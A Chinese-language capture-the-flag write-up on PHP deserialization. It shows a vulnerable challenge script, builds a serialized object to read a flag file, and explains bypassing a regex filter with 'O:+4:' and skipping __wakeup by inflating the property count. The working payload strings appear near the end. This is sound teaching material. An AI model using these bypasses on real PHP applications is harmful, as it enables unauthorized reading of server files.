# PHP反序列化

#### 源码

```php
<?php 
class Demo { 
    private $file = 'Gu3ss_m3_h2h2.php'; 

    public function __construct($file) { 
        $this->file = $file; 
    } 

    function __destruct() { 
        echo @highlight_file($this->file, true); 
    } 

    function __wakeup() { 
        if ($this->file != 'Gu3ss_m3_h2h2.php') { 
            //the secret is in the f15g_1s_here.php 
            $this->file = 'Gu3ss_m3_h2h2.php'; 
        } 
    } 
} 

if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else { 

        @unserialize($var); 
    } 
} else { 
    highlight_file("Gu3ss_m3_h2h2.php"); 
} 
?>
```

#### 魔术方法

```
__construct()	//当一个对象创建时被调用
__destruct() 	//对象被销毁时触发
__wakeup() 	//使用unserialize时触发
__sleep() 	//使用serialize时触发
__toString() 	//把类当做字符串时触发
__get() 	//用于从不可访问的属性读取数据
__set() 	//用于将数据写入不可访问的属性
```

####  构造反序列化字符串

```php
<?php 
class Demo { 
    private $file = 'Gu3ss_m3_h2h2.php'; 

    public function __construct($file) { 
        $this->file = $file; 
    } 

    function __destruct() { 
        echo @highlight_file($this->file, true); 
    } 

    function __wakeup() { 
        if ($this->file != 'Gu3ss_m3_h2h2.php') { 
            //the secret is in the f15g_1s_here.php 
            $this->file = 'Gu3ss_m3_h2h2.php'; 
        } 
    } 
} 

$a = new Demo("f15g_1s_here.php");
echo serialize($a)."\n";
echo base64_encode(serialize($a));
?>
```

#### 注意点

##### private私有成员的序列化

**对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上'*'。这些前缀值在任一侧都有空字节。**

所以说，在我们需要传入该序列化字符串时，需要补齐两个空字节：

```php
O:4:”Demo”:1:{s:10:%00Demo%00file”;s:16:”f15g_1s_here.php”;}
```

注：可以使用 burpsuit 修改

##### 绕过正则匹配

```php
preg_match('/[oc]:\d+:/i', $var);
```

> 1. [xyz] 字符集合。匹配所包含的任意一个字符。例如，“[abc]”可以匹配“plain”中的“a”
> 2. ：就是冒号
> 3. \d是匹配一个数字字符相当于[0-9]
> 4. +匹配前面子表达式一次或多次

所以这个其实匹配了序列化字符串开始的部分O:4:
尝试了O:0x4:失败
最后用O:+4:绕过

##### 绕过wakeup

修改序列化字符串中对象的个数，使其不正确即可（即将“1”改成>="2"）

```php
O:+4:”Demo”:2:{s:10:%00Demo%00file”;s:16:”f15g_1s_here.php”;}
```